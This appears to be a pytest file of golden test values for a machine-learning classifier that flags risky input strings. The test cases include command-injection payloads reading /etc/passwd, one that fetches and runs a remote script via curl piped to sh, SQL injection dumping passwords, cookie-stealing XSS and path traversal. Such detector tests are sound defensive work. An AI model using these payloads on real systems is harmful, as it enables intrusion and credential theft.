"""Golden values for the input-risk model (10 §IR). Needs models/input.joblib (python -m training.train_input)."""
import pytest

from app.input_model import InputModel
from app.preprocess import decode, extract_payload, is_plain


@pytest.fixture(scope="module")
def model():
    return InputModel.load()


@pytest.mark.parametrize("value,label", [
    ("8.8.8.8; cat /etc/passwd", "cmd_injection"),
    ("8.8.8.8%3B%20cat%20%2Fetc%2Fpasswd", "cmd_injection"),
    ("x$(curl http://10.0.0.5/s | sh)", "cmd_injection"),
    ("' OR '1'='1", "sqli"),
    ("1 UNION SELECT username, password FROM users--", "sqli"),
    ("<script>alert(document.cookie)</script>", "xss"),
    ("<img src=x onerror=alert(1)>", "xss"),
    ("../../../../etc/passwd", "path_traversal"),
    ("%2e%2e%2f%2e%2e%2fetc%2fpasswd", "path_traversal"),
])
def test_attacks_are_risky(model, value, label):
    r = model.classify(value)
    assert r["label"] == label
    assert r["risk"] >= 0.8


@pytest.mark.parametrize("value", [
    "O'Brien", "deploy", "priya.k@gmail.com", "10.0.0.12", "Q3 report; final version", "R&D budget 2026",
    "https://example.com/search?q=laptop&page=2", "SKU-4471-AB", "2026-11-14", "admin",
])
def test_normal_values_are_not_risky(model, value):
    r = model.classify(value)
    assert r["risk"] < 0.5, r


def test_response_shape(model):
    r = model.classify("host;id")
    assert set(r) == {"label", "risk", "scores", "top_features", "payload", "was_encoded"}
    assert set(r["scores"]) == {"normal", "cmd_injection", "sqli", "xss", "path_traversal"}
    assert 0.0 <= r["risk"] <= 1.0
    assert r["payload"] == "id"
    assert len(r["top_features"]) <= 5


def test_fast_path():
    assert is_plain("deploy") and is_plain("a.b-c.com") and is_plain("Priya Patel")
    assert not is_plain("/etc/passwd") and not is_plain("../x") and not is_plain("x--") and not is_plain("a;b")


def test_decode_and_payload():
    assert decode("%253B")[0] == ";" and decode("%253B")[1] is True
    assert extract_payload("8.8.8.8%3B%20cat%20/etc/passwd") == "cat /etc/passwd"
    assert extract_payload("x$(whoami)") == "whoami"
    assert extract_payload("a`id`") == "id"
    assert extract_payload("plain") is None
